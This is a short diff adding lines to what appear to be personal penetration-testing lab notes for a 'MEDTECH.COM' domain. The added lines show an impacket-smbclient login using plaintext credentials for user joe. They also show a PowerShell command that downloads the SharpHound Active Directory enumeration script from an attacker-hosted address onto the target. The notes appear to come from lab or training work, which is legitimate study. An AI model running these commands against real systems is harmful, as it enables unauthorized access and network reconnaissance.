@@ -140,4 +140,16 @@ much better shell, lets try ftp again
 
 its there lettuce pray
 
+wtf... syntax is always my issues... Well using 
+``` bash
+impacket-smbclient MEDTECH.COM/joe:Flowers1@172.16.201.11
+```
+
+Was able to grab the file, but bloodhound is complaining about the ingestor exe. lets try the powershell module
+
+```bash
+iwr -uri "http://192.168.45.228:8888/SharpHound.ps1" -outfile "C:\Users\joe\Downloads\sharp.ps1"
+```
+
+
 
